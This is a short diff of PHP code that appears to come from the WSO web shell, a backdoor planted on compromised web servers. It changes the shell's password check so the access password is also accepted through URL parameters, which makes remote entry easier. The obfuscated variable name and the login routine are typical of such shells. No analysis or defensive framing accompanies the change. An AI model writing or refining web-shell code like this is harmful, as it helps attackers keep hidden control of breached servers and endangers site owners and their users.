@@ -239,7 +239,7 @@ $uEjSi = $_SERVER['HTTP_HOST'];
 
 
 if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) 
-    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) ) 
+    if( empty($auth_pass) || ( isset($_REQUEST['pass']) && (md5($_REQUEST['pass']) == $auth_pass) ) ) 
         $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
     else
         wsoLogin(); 
